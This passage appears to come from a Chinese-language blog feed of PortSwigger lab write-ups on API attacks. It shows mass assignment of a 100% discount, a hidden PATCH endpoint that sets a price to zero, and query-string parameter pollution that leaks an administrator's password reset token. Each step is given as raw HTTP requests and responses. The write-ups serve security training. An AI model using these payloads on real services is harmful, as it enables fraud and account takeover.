&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /api/checkout &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;chosen_discount&amp;#34;:{&amp;#34;percentage&amp;#34;:0},&amp;#34;chosen_products&amp;#34;:[{&amp;#34;product_id&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;name&amp;#34;:&amp;#34;Lightweight \&amp;#34;l33t\&amp;#34; Leather Jacket&amp;#34;,&amp;#34;quantity&amp;#34;:1,&amp;#34;item_price&amp;#34;:133700}]}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/checkout HTTP/2
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">POST, GET&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>尝试使用&lt;code>PATCH&lt;/code>Method，将&lt;code>GET&lt;/code>的返回作为Request body，并修改&lt;code>chosen_discount&lt;/code>内的参数为&lt;code>100&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /api/checkout &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;chosen_discount&amp;#34;:{&amp;#34;percentage&amp;#34;:100},&amp;#34;chosen_products&amp;#34;:[{&amp;#34;product_id&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;name&amp;#34;:&amp;#34;Lightweight \&amp;#34;l33t\&amp;#34; Leather Jacket&amp;#34;,&amp;#34;quantity&amp;#34;:1,&amp;#34;item_price&amp;#34;:133700}]}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/cart/order-confirmation?order-confirmed=true&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Finding and exploiting an unused API endpoint</title><link>/portswigger-posts/api-testing-lab-exploiting-unused-api-endpoint/</link><pubDate>Sun, 15 Dec 2024 13:07:53 +0800</pubDate><guid>/portswigger-posts/api-testing-lab-exploiting-unused-api-endpoint/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>点击&lt;code>Home&lt;/code>回到商品页，并点击&lt;code>Lightweight &amp;quot;l33t&amp;quot; Leather Jacket&lt;/code>商品&lt;code>View details&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/products/1/price HTTP/2
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">GET, PATCH&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>尝试使用&lt;code>PATCH&lt;/code>Method
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Only &amp;#39;application/json&amp;#39; Content-Type is supported&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>新增请求头&lt;code>Content-Type: application/json&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;&amp;#39;price&amp;#39; parameter missing in body&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>新增&lt;code>request body&lt;/code>中&lt;code>price&lt;/code>参数
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#f92672">&amp;#34;price&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;price&amp;#34;:&amp;#34;$0.00&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面后看到商品价格为0元
&lt;img alt="Price" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-2.jpg">&lt;/li>
&lt;li>在商品内容最下方点击&lt;code>Add to cart&lt;/code>后，点击页面右上方&lt;code>购物车&lt;/code>进入购物车页面，点击&lt;code>Place order&lt;/code>即可解题
&lt;img alt="Place order" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-3.jpg">
`&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting server-side parameter pollution in a query string</title><link>/portswigger-posts/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string/</link><pubDate>Sat, 14 Dec 2024 22:59:14 +0800</pubDate><guid>/portswigger-posts/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>进入登录页面，点击&lt;code>Forgot password?&lt;/code>&lt;/li>
&lt;li>输入&lt;code>administrator&lt;/code>后点击&lt;code>Submit&lt;/code>，对应Request
&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-2.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在上述Request送出时，会获得&lt;code>javascript&lt;/code>，当中包含代码片段，说明若url中包含&lt;code>reset-token&lt;/code>参数则跳转到&lt;code>/forgot-password?reset_token=${resetToken}&lt;/code>，否则为当前场景下看到的页面
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">forgotPwdReady&lt;/span>(() =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">queryString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">search&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(&lt;span style="color:#a6e22e">queryString&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">resetToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;reset-token&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">resetToken&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">`/forgot-password?reset_token=&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">resetToken&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;forgot-password-btn&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span>.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;click&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">displayMsg&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>下述开始通过猜测&lt;code>POST /forgot-password&lt;/code>的Request body来获得&lt;code>reset_token&lt;/code>
&lt;ol>
&lt;li>修改Request body，将&lt;code>username&lt;/code>修改为随机用户&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Invalid username.&amp;#34;}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>尝试使用URL编码(&lt;code>#&lt;/code>)截断服务器端查询字符串&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;error&amp;#34;: &amp;#34;Field not specified.&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>猜测服务器端包含&lt;code>field&lt;/code>参数，在Request body尾端新增&lt;code>&amp;amp;field=x#&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=x%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Invalid field.&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>通过Burp Intruder进行参数值猜测，&lt;code>Payload&lt;/code>选择&lt;code>Simple list&lt;/code>、&lt;code>Payload configuration&lt;/code>选择&lt;code>Server-side variable names&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=§x§%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>使用&lt;code>Intruder attack results filter&lt;/code>进行结果过滤，获得可能的参数值
&lt;img alt="Intruder attack results filter" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-3.jpg">
&lt;img alt="Intruder attack results" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-4.jpg">&lt;/li>
&lt;li>使用&lt;code>email&lt;/code>带入参数值&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=email%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
&lt;li>使用javascript所需要的&lt;code>reset_token&lt;/code>带入参数值&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=reset_token%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;reset_token&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;zinhaiat2t4zg3zgx7svz951qokdb33b&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面使用&lt;code>/forgot-password?reset_token=zinhaiat2t4zg3zgx7svz951qokdb33b&lt;/code>进行访问
&lt;img alt="Reset password" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-5.jpg">&lt;/li>
&lt;li>使用更新后的密码登录&lt;code>administrator&lt;/code>，登录成功后点击右上方的&lt;code>Admin panel&lt;/code>
&lt;img alt="Admin panel" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-6.jpg">&lt;/li>
&lt;li>点击&lt;code>carlos - Delete&lt;/code>后即可解题&lt;/li>
